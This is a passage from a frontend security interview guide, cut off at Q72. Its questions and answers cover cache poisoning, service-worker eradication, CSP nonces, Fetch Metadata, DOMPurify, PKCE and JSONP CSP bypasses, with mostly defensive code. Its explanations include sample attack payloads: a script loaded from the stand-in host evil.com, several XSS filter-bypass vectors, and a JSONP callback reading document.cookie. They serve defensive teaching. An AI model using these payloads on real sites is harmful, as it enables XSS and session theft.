  Attacker ──► GET /  with  X-Forwarded-Host: evil.com
  Origin reflects host into  <script src="//evil.com/app.js">   (unkeyed in cache key!)
  CDN caches this response under key "GET /"
  Every normal user ──► GET /  ──► served the POISONED page from cache  ──► XSS for all

Cache deception (path confusion tricks cache into storing private data):
  Victim authenticated.  Attacker lures them to  /account/info.css   (a non-existent
  static-looking suffix). Origin ignores the suffix, returns the victim's PRIVATE
  /account/info as if it were a .css file. CDN sees ".css" -> caches it as a static asset.
  Attacker then fetches /account/info.css  ──► served the victim's cached private data.
```

**Web cache deception** is the inverse: the attacker tricks the cache into storing a victim's *private, authenticated* response as if it were a cacheable static asset (by appending a static-looking extension like `.css`/`.js` to a dynamic URL that the origin ignores but the CDN's caching rules match), then retrieves it from the shared cache. The defenses are architectural: **(1) Cache key correctness** — ensure everything that affects the response is in the cache key (use `Vary` correctly, key on relevant headers), and *never reflect unkeyed request headers* (`X-Forwarded-Host`, etc.) into responses. **(2) Explicitly mark personalized/authenticated responses `Cache-Control: private, no-store`** so they're never cached in a shared layer, and configure the CDN to *never* cache anything with a `Set-Cookie` or `Authorization`-derived content. **(3) Don't let file-extension/path heuristics override `Cache-Control`** — many cache-deception attacks succeed because the CDN caches `*.css` regardless of the origin's headers; align CDN rules to honor origin caching directives and only cache truly static paths. **(4) Normalize/strip ambiguous inputs at the edge** (reject unexpected headers, canonicalize paths) and test with a tool like Param Miner. The expert framing: a shared cache is a *trust amplifier* — it takes one attacker-shaped or one victim-specific response and serves it to everyone, so caching must be designed so that (a) nothing that varies the response is unkeyed, and (b) nothing private is ever eligible for the shared cache. This is squarely a frontend/edge architecture responsibility, not just a backend one.

#### Q60. [Practical] An XSS was used to install a malicious service worker that persists after you patched the original bug. Lead the eradication — why is this uniquely hard, and what's the remediation?

This is one of the nastiest frontend incidents because a service worker is a **persistent, origin-scoped, self-reviving foothold** — patching the XSS that installed it does *not* remove it. A malicious SW registered during the XSS keeps intercepting every request within its scope (serving poisoned HTML/JS, exfiltrating data, even re-injecting the XSS payload into otherwise-clean pages), it runs independently of any open tab, and it survives reloads and the original-bug fix. It can even be programmed to resist removal. So the eradication problem is "how do I forcibly evict attacker-controlled code that lives in every victim's browser and re-serves itself."

```
Why patching the XSS isn't enough:
  XSS (now patched) ──► navigator.serviceWorker.register('/evil-sw.js', {scope:'/'})
        │
        ▼
  Malicious SW persists in the browser, intercepts ALL fetches under "/",
  can serve a cached poisoned index.html that RE-INTRODUCES the XSS,
  and keeps running after the tab closes and after you deploy the fix.
```

The remediation playbook: **(1) Contain — stop new installs.** Ship the XSS fix *and* tighten CSP (`script-src` nonce + `worker-src 'self'`) so no rogue worker can be registered again; if an active attack is ongoing, you may temporarily disable service workers for the origin via edge config. **(2) Push a "kill-switch" service worker.** Because a browser checks for SW updates, the canonical eradication is to **deploy a new, benign service worker at the same scope/URL that the browser will fetch and install, whose job is to clean up and then unregister itself** — e.g., it calls `caches.keys().then(ks => ks.map(caches.delete))` to purge poisoned caches, `self.registration.unregister()`, and forces clients to reload onto clean assets. You must ensure the browser actually fetches the *new* worker, which means **serving the `service-worker.js` file itself with `Cache-Control: no-cache`** (a common root cause is the SW script being cached so the update never arrives — and if the *attacker's* SW is intercepting its own update, you may need server-side cache busting and the 24-hour browser SW-update bypass to win). **(3) Rotate credentials.** Treat any session/token that passed through the malicious SW's interception window as compromised — force re-authentication, rotate secrets, invalidate sessions server-side. **(4) Assess data exposure** and meet disclosure obligations (Q25). **(5) Systemic fix:** add `worker-src`/`script-src` to CSP permanently, monitor SW registrations (you can report them), serve all SW scripts `no-cache`, and add the "register a clean SW" capability to your incident runbook *before* you need it.

The expert insight that separates a senior response: service workers move part of your application into a *persistent, attacker-reachable execution context inside the user's browser*, so an XSS that touches `serviceWorker.register` is a categorically worse incident than a transient XSS — eradication requires actively pushing a self-removing replacement worker (not just fixing the bug), and prevention requires `worker-src` in CSP plus `no-cache` on the worker script so you retain the ability to update it. The takeaway for the postmortem: persistence mechanisms (service workers, but also long-lived caches and `localStorage`-stored payloads) must be in scope for every XSS incident, because "fixed the injection" is not the same as "evicted the attacker."

## 🧩 Extended Questions — Set 2: Coding, Design & Expert Scenarios

### 🟢 Basic — extended

#### Q61. [Coding] Write a small helper that builds a DOM node from untrusted text plus a trusted template, without ever using `innerHTML`.

**Problem:** You need to render a list of user comments where each item shows an avatar, a username, and the comment body — all three are untrusted strings. A junior reaches for a template literal piped into `innerHTML`; show the safe, sink-free way using `createElement`/`textContent`/property assignment.

```javascript
// ❌ the tempting-but-dangerous version — every interpolation is an XSS sink
function renderCommentBad(c) {
  el.innerHTML = `<li><img src="${c.avatar}"><b>${c.name}</b>: ${c.body}</li>`;
}

// ✅ build nodes; text goes through textContent, the URL through a sanitizer
const SAFE_PROTOCOLS = new Set(['http:', 'https:']);
function safeImgSrc(url) {
  try { return SAFE_PROTOCOLS.has(new URL(url, location.href).protocol) ? url : ''; }
  catch { return ''; }
}

function renderComment(c) {
  const li = document.createElement('li');

  const img = document.createElement('img');
  img.src = safeImgSrc(c.avatar);        // property assignment, scheme-checked (Q20)
  img.alt = '';                          // decorative; no untrusted alt injection needed

  const name = document.createElement('b');
  name.textContent = c.name;             // inert text — no parsing, no execution

  const body = document.createTextNode(`: ${c.body}`); // text node, never parsed as HTML

  li.append(img, name, body);
  return li;                             // caller appends to the live list
}
```

**Why this is the right default:** the unifying XSS principle is "untrusted data must reach the DOM as *data*, not as markup the parser interprets." `textContent` and `createTextNode` never invoke the HTML parser, so `<img onerror=...>` in `c.body` becomes literally the characters `<img onerror=...>` on screen — visible, harmless. The only attribute that needs real validation is `img.src`, because a URL is the one place a string can still smuggle a `javascript:` scheme; everything else is structurally safe by virtue of *which API you chose*.

The deeper lesson for the candidate: prefer building DOM with element/text APIs over string concatenation, because the safety is then a property of the code shape rather than something you have to remember to escape on every interpolation. In a framework you'd let JSX/mustache do exactly this for you — `{c.body}` is `textContent`, not `innerHTML` — which is why "just use the framework's default binding" beats hand-rolled string templates. **Time/Space:** O(n) over the number of fields; one allocation per node.

#### Q62. [Theory] What is the difference between escaping, encoding, and sanitizing? Candidates conflate these — pin down each with an example.

These three words get used interchangeably in code reviews, but they describe different operations with different guarantees, and using the wrong one is a frequent root cause of XSS. **Encoding** transforms data so a parser in a *specific context* treats it as inert — HTML-entity encoding turns `<` into `&lt;` so the HTML parser renders it as a literal character instead of a tag start. **Escaping** is essentially context-specific encoding (the terms overlap) — "escape this for a JS string", "escape this for a URL query" — and the critical word is *context*: the right transform for HTML content is wrong for a JS string, a URL, or a CSS value. **Sanitizing** is fundamentally different: it *parses and removes/rewrites* dangerous parts of richer input while *preserving safe structure* — DOMPurify takes `<b>hi</b><img onerror=x>` and returns `<b>hi</b>`, keeping the allowed markup and dropping the dangerous node.

```
Operation    Input                         Output                       Use when
-----------  ----------------------------  ---------------------------  ----------------------------
Encode/      <b>hi</b>                      &lt;b&gt;hi&lt;/b&gt;        you want to DISPLAY text as
escape (HTML)                                                           literal text (the common case)
Escape (JS)  he said "hi"                   he said \"hi\"               injecting into a JS string
Encode (URL) a&b=c                          a%26b%3Dc                    a URL query/path component
Sanitize     <b>hi</b><img onerror=x>       <b>hi</b>                    you must ALLOW some HTML
                                                                        (rich text) but drop danger
```

The decision rule: if you only need to *show* untrusted text, **encode** for the destination context (and prefer `textContent`, which encodes implicitly). If you genuinely must *render attacker-influenced HTML* (a WYSIWYG comment, markdown output), **sanitize** with a parser-based allowlist library — never try to "encode" your way to safe HTML, because encoding everything would defeat the purpose (you'd display the tags as text) and selectively encoding by hand reinvents a sanitizer badly. The classic mistake is sanitizing when you should encode (overkill, and you might allow something) or encoding when you should sanitize (you mangle legitimate rich text), and the most dangerous mistake is encoding for the *wrong context* — HTML-escaping a value that lands inside a `<script>` block or an `href`, where HTML entities don't neutralize the threat at all.

### 🟡 Intermediate — extended

#### Q63. [Coding] Implement an Express middleware that generates a per-response CSP nonce and exposes it to templates. Show the wiring end to end.

**Problem:** A strict CSP needs a fresh, cryptographically random nonce on *every* response, set in the header and stamped on every trusted `<script>`/`<style>` tag. Build the middleware and show how a template consumes it, including the common cache pitfall.

```javascript
import { randomBytes } from 'node:crypto';

// 1. Generate a fresh nonce per request and set the header.
function cspNonce(req, res, next) {
  const nonce = randomBytes(16).toString('base64'); // 128 bits, fresh PER RESPONSE
  res.locals.cspNonce = nonce;                       // expose to the view layer

  res.setHeader('Content-Security-Policy', [
    "default-src 'self'",
    // strict-dynamic: trust scripts loaded BY a nonced script; ignore host allowlist
    `script-src 'nonce-${nonce}' 'strict-dynamic' https:`,
    `style-src 'self' 'nonce-${nonce}'`,
    "object-src 'none'",
    "base-uri 'self'",
    "frame-ancestors 'none'",
  ].join('; '));

  next();
}

app.use(cspNonce);

// 2. Template stamps the SAME nonce on trusted inline scripts (EJS shown):
//    <script nonce="<%= cspNonce %>"> initApp() </script>
//    <script nonce="<%= cspNonce %>" src="/bundle.js"></script>

// 3. CRITICAL: a nonced response must NOT be cached, or the stale nonce mismatches.
function noCacheHtml(req, res, next) {
  res.setHeader('Cache-Control', 'no-store');
  next();
}
```

**Why per-response freshness matters:** the entire security value of a nonce is that an attacker who injects `<script>` into the page body cannot guess the random nonce, so the injected script lacks the `nonce` attribute and the browser refuses to run it. If you reuse a static nonce (or cache an HTML page with its nonce baked in and serve it to many users), the value becomes predictable/known and the protection collapses — a cached nonce is effectively `'unsafe-inline'`. This is the single most common way teams accidentally neutralize their own strict CSP.

Two production refinements: first, `'strict-dynamic'` means you only need to nonce the *entry-point* scripts; scripts they load dynamically inherit trust, so you don't maintain a sprawling host allowlist (Q35). Second, in a real app I'd use a maintained library (`helmet` with a nonce generator, or framework-native support in Next.js/Remix) rather than hand-rolling, because they handle edge cases like nonce propagation into streamed responses and the interaction with HTTP caching. The header must be set *before* the body streams, which is why it's middleware that runs early. **Time/Space:** O(1) per request for nonce generation; negligible.

#### Q64. [Coding] Write a server-side guard that rejects state-changing requests using Fetch Metadata (`Sec-Fetch-*`) headers, with a safe fallback.

**Problem:** Implement a "Resource Isolation Policy" middleware that uses the browser-set, unforgeable `Sec-Fetch-*` headers to block cross-site state-changing requests (a strong, modern CSRF defense), while not breaking same-origin navigation or non-browser clients that don't send these headers.

```javascript
// Fetch Metadata is set by the browser and CANNOT be altered by JS, so it's a
// trustworthy signal for the SERVER to decide whether to honor a request.
function fetchMetadataGuard(req, res, next) {
  const site = req.headers['sec-fetch-site'];  // same-origin | same-site | cross-site | none
  const mode = req.headers['sec-fetch-mode'];  // navigate | cors | no-cors | ...
  const dest = req.headers['sec-fetch-dest'];  // document | empty | image | ...

  // 1. Legacy / non-browser clients omit Sec-Fetch-* entirely -> allow (fail-open here
  //    is intentional; this layer SUPPLEMENTS, not replaces, auth + CSRF tokens).
  if (!site) return next();

  // 2. Same-origin and same-site requests are always fine.
  if (site === 'same-origin' || site === 'same-site') return next();

  // 3. 'none' = user-initiated (typed URL, bookmark) -> allow.
  if (site === 'none') return next();

  // 4. cross-site: allow only safe top-level GET navigations and simple
  //    embeds (images, etc.); block cross-site requests that try to ACT.
  const isTopLevelNavigation = mode === 'navigate' && req.method === 'GET';
  const isSimpleEmbed = ['image', 'font', 'style', 'script'].includes(dest);
  if (isTopLevelNavigation || isSimpleEmbed) return next();

  return res.status(403).json({ error: 'Cross-site request blocked' });
}
```

**Why this works and where it sits in the stack:** `Sec-Fetch-Site` is computed by the browser based on the relationship between the initiator and the target, and unlike `Referer`/`Origin` it cannot be spoofed or stripped by page JavaScript — so a server seeing `Sec-Fetch-Site: cross-site` on a POST knows with high confidence it's a forged cross-site request and can reject it. This is precisely the CSRF vector (Q8): the classic auto-submitting form on `evil.com` produces a `cross-site` request, which this guard blocks before any handler runs.

The design judgment is in the *fallback*: I fail-open when the headers are absent because some legitimate non-browser clients (curl, server-to-server, very old browsers) don't send them, and a hard fail-closed would break those. That's acceptable only because this is a *defense-in-depth layer* on top of `SameSite=Lax` cookies and CSRF tokens — never the sole control. The pattern (allow same-origin/same-site/none, allow cross-site only for top-level GET navigation and passive embeds, block everything else) is exactly Google's recommended "Fetch Metadata Resource Isolation Policy." **Time/Space:** O(1) header inspection per request.

#### Q65. [Coding] Configure DOMPurify correctly for a comment system that allows basic formatting and links but must block `javascript:` links and `target`-based tabnabbing.

**Problem:** You're rendering user-authored rich text (bold, italic, links, lists). Show a hardened DOMPurify configuration — not just `DOMPurify.sanitize(input)` — that allows a small tag/attribute set, forces safe link behavior, and demonstrate the hooks for the gaps DOMPurify doesn't close by default.

```javascript
import DOMPurify from 'dompurify';

// 1. Tight allowlist: only the tags/attrs a comment actually needs.
const CONFIG = {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li', 'code'],
  ALLOWED_ATTR: ['href'],                 // NOT target/style/onclick/etc.
  ALLOWED_URI_REGEXP: /^(?:https?:|mailto:)/i, // belt: only safe schemes on href
  FORBID_TAGS: ['style'],
  FORBID_ATTR: ['style'],
};

// 2. Hook: harden every link AFTER sanitization — force noopener/noreferrer and
//    strip any target the user supplied (prevents reverse tabnabbing, Q32).
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.tagName === 'A') {
    node.setAttribute('rel', 'noopener noreferrer nofollow');
    node.setAttribute('target', '_blank');   // open externally, safely
  }
});

export function renderComment(dirty) {
  return DOMPurify.sanitize(dirty, CONFIG);  // returns a safe HTML string
}
```

**Why each piece is necessary:** the default `DOMPurify.sanitize(input)` is already safe against XSS, but a *correct* config for a real feature does more than block scripts. Restricting `ALLOWED_TAGS`/`ALLOWED_ATTR` to the minimum shrinks the surface (no `style` attribute means no CSS-based exfiltration or layout attacks, no `target` means the user can't set tabnabbing behavior). `ALLOWED_URI_REGEXP` is defense-in-depth on `href` schemes; DOMPurify already blocks `javascript:` by default, but pinning to `https?:|mailto:` makes the intent explicit and survives config drift. The `afterSanitizeAttributes` hook is the key advanced move — it lets you *normalize* output that's safe-but-not-ideal: here it guarantees every surviving link gets `rel="noopener noreferrer"`, closing the reverse-tabnabbing gap that sanitization alone doesn't address because tabnabbing isn't an XSS, it's a behavior issue.

The production caveats: keep DOMPurify *updated* (mXSS bypasses ship fixes in new versions, Q39); run it on the platform where it's hardened (in Node/SSR use `jsdom` + DOMPurify, and be aware server-side and client-side parsers differ subtly); and stack a strict CSP behind it so even a future DOMPurify bypass hits a second wall. The interview signal is recognizing that "use DOMPurify" is necessary but the *configuration and hooks* are where you encode your actual policy — an empty-config sanitize is safe, a tuned one is *correct*. **Time/Space:** O(n) over input length (full parse + tree walk).

#### Q66. [Theory] A teammate proposes "we'll just strip `<script>` tags with a regex before rendering." Give a rigorous explanation of why this fails.

Regex-based HTML sanitization is the canonical "looks reasonable, is catastrophically wrong" security mistake, and being able to articulate *why* — beyond "regex bad" — is a strong intermediate signal. The fundamental problem is a **language-class mismatch**: HTML (with its nesting, optional/implied tags, error recovery, and multiple parsing contexts) is not a regular language, so a regular expression cannot reliably parse it. The browser's HTML parser is a complex state machine that accepts malformed input and "fixes" it in ways a regex author never anticipates, so any string-level filter is reasoning about a different artifact than the DOM the browser will actually build.

```
Why "strip <script>" is bypassed (each evades a naive /<script.*?>/ filter):

  1. There are MANY script vectors, not just <script>:
       <img src=x onerror=alert(1)>          (event handler attribute)
       <svg onload=alert(1)>                  (SVG context)
       <a href="javascript:alert(1)">         (URL scheme)
       <iframe srcdoc="<script>...">          (nested document)
       <style>@import 'evil.css'</style>      (CSS-based)

  2. Obfuscation defeats the pattern itself:
       <scr<script>ipt>      -> removing inner <script> leaves "<script>"
       <SCRIPT >, <script/x>, <script\x00>    (case, whitespace, null byte)

  3. The parser MUTATES markup after your filter ran (mXSS, Q39) -> a string
     that contained no <script> can become executable once assigned to innerHTML.
```

The three independent failure axes are devastating in combination: **(a)** script execution has dozens of vectors (event handlers, `javascript:` URLs, SVG/MathML, `srcdoc`, CSS imports), so blocklisting `<script>` addresses one of many; **(b)** the attacker controls the input and can obfuscate around any fixed pattern (`<scr<script>ipt>`, mixed case, embedded whitespace/null bytes, attribute-value tricks), and a blocklist must be perfect while the attacker needs only one miss; **(c)** even a string with no dangerous tokens can be *mutated by the browser's parser* into something executable, which a string regex literally cannot see. The correct approach is the inverse philosophy: don't blocklist dangerous patterns in a string, **parse the input into a DOM and allowlist** the specific safe nodes/attributes (a parser-based sanitizer like DOMPurify, Q65), because allowlisting on the real parsed tree is the only model that matches how the browser interprets the content. The summary line for the interview: "you cannot regex your way out of a problem caused by a parser more complex than regex — sanitize on the parsed DOM with an allowlist, or use `textContent` and avoid HTML entirely."

#### Q67. [Coding] Implement secure client-side validation for a file upload (type, size, magic-byte sniffing) and explain why none of it is a real security control.

**Problem:** A profile-photo uploader should reject non-images and oversized files for good UX. Implement robust client-side checks — including reading the file's magic bytes rather than trusting the extension/MIME — then explain why the server must redo all of it.

```javascript
const MAX_BYTES = 5 * 1024 * 1024;            // 5 MB
// Magic numbers: the real file type lives in the first bytes, not the name.
const SIGNATURES = {
  'image/png':  [0x89, 0x50, 0x4e, 0x47],
  'image/jpeg': [0xff, 0xd8, 0xff],
  'image/gif':  [0x47, 0x49, 0x46, 0x38],
};

function matchesSignature(bytes, sig) {
  return sig.every((b, i) => bytes[i] === b);
}

async function validateImage(file) {
  if (file.size > MAX_BYTES) throw new Error('File too large');
  if (file.size === 0) throw new Error('Empty file');

  // Read only the first 8 bytes — don't load the whole file to check the header.
  const header = new Uint8Array(await file.slice(0, 8).arrayBuffer());

  const matched = Object.entries(SIGNATURES).find(([, sig]) =>
    matchesSignature(header, sig));
  if (!matched) throw new Error('Not a supported image (magic-byte check failed)');

  // NOTE: file.type (the browser-reported MIME) is attacker-controllable and
  // derived from the extension — we deliberately trust the BYTES instead.
  return matched[0]; // the real detected type
}
```

**Why magic bytes beat extension/MIME — and why it still doesn't matter for security:** the file extension and `file.type` are trivially forgeable (rename `evil.html` to `avatar.png`), so reading the actual signature bytes is a meaningfully better *UX* validation — it catches honest mistakes and naive tampering. But every line of this runs in the browser, fully under the attacker's control: they can disable the JS, intercept and modify the request after validation, or hit your upload endpoint directly with `curl`. Client-side validation cannot be a security boundary for the same reason no client-side check can (Q3) — the user owns the runtime.

So the server must independently: re-check size and magic bytes; re-derive the content type from the bytes (not the client's claim); **store user files on a separate sandbox origin** (Q27) and serve them with `Content-Type: <detected>`, `X-Content-Type-Options: nosniff` (Q51), and `Content-Disposition: attachment` where appropriate so a polyglot file (e.g., a valid-GIF-that's-also-HTML) can't execute as script in your origin; strip/transcode images (re-encode through an image library) to destroy embedded payloads and EXIF; randomize stored filenames to prevent path traversal and overwrite; and scan for malware. The client validation's only legitimate jobs are *fast feedback* and *bandwidth saving* — framing it as anything more is the trap the question is testing. **Time/Space:** O(1) — reads only the 8-byte header regardless of file size.

#### Q68. [Theory] Design exercise: walk through how you'd threat-model a new "share document via public link" feature before writing code.

Threat modeling a feature before coding is a senior habit, and a public-share-link feature is a rich target because it deliberately punches a hole in your access-control model. I'd run a lightweight STRIDE-style pass anchored on three questions: *what are the assets, what are the trust boundaries, and what can an attacker do at each boundary?* The assets are the shared document's contents and the link itself (which is now a bearer credential); the trust boundary is the moment an unauthenticated, unknown internet user presents a link and expects access.

```
Asset: document contents + the share link (a capability/bearer token)
Boundary: unauthenticated visitor -> "is this link valid & what does it grant?"

STRIDE-lite for the feature
---------------------------------------------------------------------------------
Spoofing      Can a link be guessed/enumerated? -> use 128-bit unguessable random
              tokens, NOT sequential IDs; rate-limit link resolution.
Tampering     Can a viewer escalate view->edit by editing the URL/role param? ->
              the token encodes/maps to a fixed permission server-side; never trust
              a client-supplied role.
Repudiation   Do we log who accessed via link & when? -> audit trail for shares.
Info disclos. Does the link leak via Referer to embedded third parties / analytics?
              -> Referrer-Policy (Q56); strip tokens from URLs sent off-origin.
DoS           Can someone brute-force/scrape links? -> rate-limit, expiry, revocation.
Elevation     Does a public link inadvertently grant API scopes beyond read of THIS
              doc? -> scope the capability to exactly one resource + action.
```

The design decisions that fall out: the link token must be **high-entropy and unguessable** (so it can't be enumerated) and should map server-side to a *specific resource and a specific permission* (view-only by default), because a share link is effectively a capability — possession equals access, so it must grant the *least* it can. It needs **lifecycle controls**: expiry, the ability to revoke, and ideally optional password/email-gating for sensitive shares. Because the token rides in the URL, I have to reason about **leakage channels** — `Referer` headers to any third-party resource loaded on the shared page, browser history, and analytics — and mitigate with `Referrer-Policy: no-referrer` on share pages and by keeping the token out of anything sent cross-origin. I'd also rate-limit link *resolution* to defeat scraping/enumeration, log access for auditability, and make sure the public-view endpoint can't be pivoted into authenticated API scopes (the link grants read of *one* document, not a session).

The meta-point the interviewer is looking for: threat modeling turns a vague "make sharing secure" into a concrete checklist of *boundaries and abuses*, and the highest-leverage realization here is reframing the share link as a **bearer capability** — once you see it that way, unguessability, least-privilege scoping, expiry, revocation, and leak-channel control become obvious requirements rather than afterthoughts. Doing this *before* coding is what prevents the "we'll add expiry later" debt that turns into an incident.

### 🟠 Advanced — extended

#### Q69. [Coding] Implement OAuth PKCE generation (verifier + S256 challenge) and the `state` check using only Web Crypto in the browser.

**Problem:** Implement the client side of Authorization Code + PKCE (Q17) for an SPA: generate a high-entropy `code_verifier`, derive the `code_challenge` via SHA-256, generate a `state` for CSRF protection on the redirect, and verify `state` on return — all with the standard Web Crypto API, no libraries.

```javascript
// --- helpers ---
function randomUrlSafe(bytes = 32) {
  const buf = crypto.getRandomValues(new Uint8Array(bytes));
  return base64url(buf);                 // 256 bits of entropy
}
function base64url(bytes) {
  return btoa(String.fromCharCode(...bytes))
    .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}
async function sha256(str) {
  const digest = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(str));
  return base64url(new Uint8Array(digest));
}

// --- 1. Before redirecting to /authorize ---
export async function beginLogin(authorizeUrl, clientId, redirectUri) {
  const codeVerifier = randomUrlSafe(32);        // 43-128 chars after b64url
  const codeChallenge = await sha256(codeVerifier);
  const state = randomUrlSafe(16);

  // Persist across the redirect. sessionStorage is acceptable for these
  // short-lived, single-use values (gone when the tab closes); never store
  // the eventual ACCESS TOKEN here.
  sessionStorage.setItem('pkce_verifier', codeVerifier);
  sessionStorage.setItem('oauth_state', state);

  const url = new URL(authorizeUrl);
  url.search = new URLSearchParams({
    response_type: 'code', client_id: clientId, redirect_uri: redirectUri,
    code_challenge: codeChallenge, code_challenge_method: 'S256',
    state, scope: 'openid profile',
  }).toString();
  location.assign(url.toString());
}

// --- 2. On the /callback page ---
export function handleCallback() {
  const params = new URLSearchParams(location.search);
  const returnedState = params.get('state');
  const expected = sessionStorage.getItem('oauth_state');

  if (!returnedState || returnedState !== expected) {
    throw new Error('State mismatch — possible CSRF on the redirect');
  }
  sessionStorage.removeItem('oauth_state');       // single-use
  const code = params.get('code');
  const verifier = sessionStorage.getItem('pkce_verifier');
  sessionStorage.removeItem('pkce_verifier');
  // POST {code, code_verifier} to /token (ideally to your BFF, not the IdP directly).
  return { code, verifier };
}
```

**Why each cryptographic choice is load-bearing:** the `code_verifier` must come from a CSPRNG (`crypto.getRandomValues`, never `Math.random`) with ≥256 bits of entropy, because PKCE's whole guarantee is that an attacker who intercepts the authorization `code` can't redeem it without the verifier (Q17) — a guessable verifier defeats it. The challenge uses `S256` (SHA-256), not the `plain` method, so even if the `code_challenge` leaks during the front-channel redirect, it can't be reversed to the verifier. The `state` is an independent CSRF token for the redirect itself: it ensures the `/callback` you're processing corresponds to a login *this* browser initiated, defeating an attacker who tries to inject their own authorization code into your session (a "login CSRF"). Verifying it must be a strict equality check against a freshly-generated, single-use value.

The storage nuance is where seniority shows: `code_verifier` and `state` are *short-lived, single-use* secrets that must survive a full-page redirect, so `sessionStorage` is a reasonable home for *them* — but the same is emphatically *not* true of the resulting access/refresh tokens (Q12), which should be in memory + `HttpOnly` cookie or, better, never touch the SPA at all under a BFF (Q24). I'd also note `base64url` (not standard base64) is required by the spec, and that in 2026 you'd typically let the IdP SDK or your BFF do the token exchange — but being able to write the PKCE primitives shows you understand *what the SDK is doing for you*. **Time/Space:** O(1) — fixed small inputs to the digest.

#### Q70. [Coding] Build a sandboxed-iframe plugin host with an origin-validated, schema-checked `postMessage` RPC channel (both sides).

**Problem:** Implement the host side of the architecture from Q27: embed an untrusted plugin in a sandboxed iframe and expose a *narrow, capability-style* RPC over `postMessage` — with origin checks, source checks, schema validation, and request/response correlation — rather than handing the plugin raw DOM access.

```javascript
// ===== HOST (parent window) =====
const PLUGIN_ORIGIN = 'https://abc123.plugins.usercontent.example.com';

const frame = document.createElement('iframe');
frame.sandbox = 'allow-scripts';            // NO allow-same-origin => opaque origin
frame.src = `${PLUGIN_ORIGIN}/widget.html`;
document.body.appendChild(frame);

// The narrow, allowlisted capabilities the plugin may invoke. Each is a function
// the host fully controls — the plugin can only ask, never reach into the DOM/API.
const RPC_METHODS = {
  async getProfileName() { return currentUser.displayName; }, // returns ONLY this field
  async showToast({ text }) {
    if (typeof text !== 'string' || text.length > 200) throw new Error('bad arg');
    toast(text.slice(0, 200));              // host renders via textContent (safe sink)
    return true;
  },
};

window.addEventListener('message', async (e) => {
  if (e.origin !== PLUGIN_ORIGIN) return;            // 1. origin allowlist
  if (e.source !== frame.contentWindow) return;       // 2. source window check
  const msg = e.data;
  if (!msg || msg.kind !== 'rpc-request'
      || typeof msg.id !== 'string'
      || typeof msg.method !== 'string') return;      // 3. shape validation

  const handler = RPC_METHODS[msg.method];            // 4. allowlist methods only
  let reply;
  try {
    if (!handler) throw new Error('unknown method');
    reply = { kind: 'rpc-response', id: msg.id, ok: true,
              result: await handler(msg.params ?? {}) };
  } catch (err) {
    reply = { kind: 'rpc-response', id: msg.id, ok: false, error: String(err.message) };
  }
  // 5. reply to the SPECIFIC origin, never '*'
  frame.contentWindow.postMessage(reply, PLUGIN_ORIGIN);
});

// ===== PLUGIN (inside the sandboxed iframe) — calling the host =====
function callHost(method, params) {
  const id = crypto.randomUUID();
  return new Promise((resolve, reject) => {
    function onMsg(e) {
      if (e.origin !== 'https://app.example.com') return;     // validate host origin
      const m = e.data;
      if (m?.kind !== 'rpc-response' || m.id !== id) return;  // correlate by id
      window.removeEventListener('message', onMsg);
      m.ok ? resolve(m.result) : reject(new Error(m.error));
    }
    window.addEventListener('message', onMsg);
    parent.postMessage({ kind: 'rpc-request', id, method, params }, 'https://app.example.com');
  });
}
```

**The security architecture in the code:** every defense from Q21 and Q27 appears as a concrete line. The iframe is `sandbox="allow-scripts"` *without* `allow-same-origin`, which forces it into a unique opaque origin so the plugin can't reach the host's cookies or DOM even though it runs script. The host's message handler validates **origin** (the message came from the expected plugin origin), **source** (from *that* iframe, not some other window that learned the origin), and **shape** (it's a well-formed RPC request), then dispatches only to an **allowlist of methods** — the plugin can call `getProfileName`, but there is no method that returns the whole user object or makes an arbitrary API call, so the *capability surface* is exactly what the host chose to expose. Replies target the specific origin, never `'*'`, so a hijacked sibling frame can't intercept them.

The design philosophy is **capability-based, not data-based**: instead of passing the plugin a blob of state (which it could over-read) or DOM access (which it could abuse), the host exposes verbs it fully implements, validating arguments and rendering results through safe sinks (`textContent`). The `id`-based request/response correlation lets the plugin make concurrent calls without races. In production I'd layer a per-frame CSP and `Permissions-Policy` on the plugin document (Q56), enforce server-side authorization for anything `getProfileName`-like that touches real data, and treat the plugin's responses *to the host* as equally untrusted. The interview signal: you contain untrusted code by **isolating by origin, mediating by message, and exposing capabilities rather than data** — and you can write the message-passing trust checks correctly, which is the part most candidates fumble.

#### Q71. [Theory] CSP `script-src 'self'` is set, yet a pentester achieves XSS via a JSONP endpoint on your own domain. Explain the "script gadget" / CSP bypass and the fix.

This scenario exposes the central weakness of *host-based* CSP allowlists (Q35): `script-src 'self'` trusts *any* script served from your own origin, and if your origin hosts a **script gadget** — code that turns attacker-controlled input into executed script — then "self" becomes an open door. The classic gadget is a **JSONP endpoint**: JSONP works by wrapping a JSON response in a caller-named function, `/api/data?callback=foo` returning `foo({...})`. Because the `callback` parameter is reflected into the script body, an attacker can request `/api/data?callback=alert(document.cookie)//` and your own same-origin endpoint dutifully returns `alert(document.cookie)//({...})` *as `Content-Type: application/javascript`* — which `script-src 'self'` happily allows because it came from your origin.

```
CSP: script-src 'self'   (attacker can't inject inline or external scripts...)
        │
        │  but YOUR origin hosts a JSONP gadget:
        ▼
  <script src="/api/data?callback=alert(document.cookie)//"></script>
        │
        ▼
  /api/data responds (as JS, from 'self'):  alert(document.cookie)//({...})
        │
        ▼
  CSP allows it (it's 'self') -> arbitrary JS executes -> XSS despite the CSP
```

Other gadgets that defeat `'self'` similarly: an outdated AngularJS on the page (an attacker injects an Angular template expression that the framework *evaluates*), DOM-based open redirects that load attacker script, or any endpoint that reflects input into an executable response. The lesson is that a host allowlist is only as strong as the *most dangerous script-emitting endpoint on that host*, and most large sites have at least one. The robust fix is to **abandon host allowlists for a strict nonce + `'strict-dynamic'` policy** (`script-src 'nonce-{rand}' 'strict-dynamic'`): now a script is trusted only if it carries the per-response nonce (which the attacker can't predict) *or* was loaded by an already-trusted script — so the JSONP `<script src>` the attacker injects lacks the nonce and is blocked, regardless of the fact that it's same-origin. Complementary hardening: **remove JSONP entirely** (use CORS for cross-origin data, which doesn't execute responses as script), retire legacy frameworks with template-injection gadgets, and run Google's CSP Evaluator (Q58) which specifically flags `'self'`/allowlist policies as bypassable. The expert framing: CSP host allowlists answer "*where* can scripts come from," but XSS via gadgets answers "*what does trusting that source actually let an attacker do*" — `'strict-dynamic'` exists precisely because the former question turned out to be the wrong one.

#### Q72. [Coding] Implement a "secure logout everywhere" flow for the in-memory-token + HttpOnly-refresh-cookie architecture. What must happen client-side AND server-side?
